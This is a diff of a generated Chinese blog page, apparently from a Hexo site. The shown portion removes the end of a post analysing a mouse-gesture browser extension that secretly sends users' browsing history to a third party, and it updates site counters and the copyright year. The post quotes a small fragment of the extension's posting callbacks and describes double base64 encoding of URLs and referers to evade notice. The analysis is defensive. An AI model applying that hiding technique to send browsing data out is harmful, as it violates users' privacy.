class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Succeeded in posting data"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">httpCode</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Failed to retrieve content. (HTTP Code:"</span> + httpCode.status + <span class="string">")"</span>);</div><div class="line">			log.ERROR(<span class="string">"ERROR 8004 ??"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>从上述代码中可以看出在关键的浏览器当前url和referer都进行了两次base64编码处理，可以逃过一些普通用户的眼睛，难道这种方式能够躲过google的一些自动审查，比较好奇。</p>
-<p>#4 建议<br>码农也不容易，辛辛苦苦写出来的程序不赚钱只能靠窃取用户浏览历史发给第三方来获取回报，想必也是迫不得已，当然对于这种窃取隐私的绝对要抵制。mouse guesture作为一个很好用的特性，笔者已经难以离开，所以在google市场上选择了其他的guesture插件。有了这个教训，相信大家以后使用浏览器插件肯定会多长一双眼睛。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2253,7 +2256,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">33</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2264,7 +2267,7 @@
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2275,7 +2278,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">113</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2353,7 +2356,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
